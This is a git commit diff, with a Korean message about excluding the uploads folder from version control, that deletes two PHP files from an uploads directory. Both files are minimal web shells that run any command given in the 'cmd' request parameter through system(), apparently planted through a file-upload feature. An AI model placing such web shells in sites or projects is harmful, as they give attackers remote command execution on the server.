2f041796cda8520d9026445f3e6aa4e2fc1cb65b
Jaenact <leejaehyun0908@naver.com>
2025-07-15 00:23:16 +0900

    uploads 폴더 git 관리 제외

--- uploads/6863a8f74b5af.php
+++
@@ -1,9 +0,0 @@
-<?php
-if (isset($_GET['cmd'])) {
-    echo "<pre>";
-    system($_GET['cmd']);
-    echo "</pre>";
-} else {
-    echo "사용법: ?cmd=명령어";
-}
-?>
--- uploads/686511b6587cf.php
+++
@@ -1,7 +0,0 @@
-<?php
-if (isset($_REQUEST['cmd'])) {
-    echo "<pre>";
-    system($_REQUEST['cmd']);
-    echo "</pre>";
-}
-?>
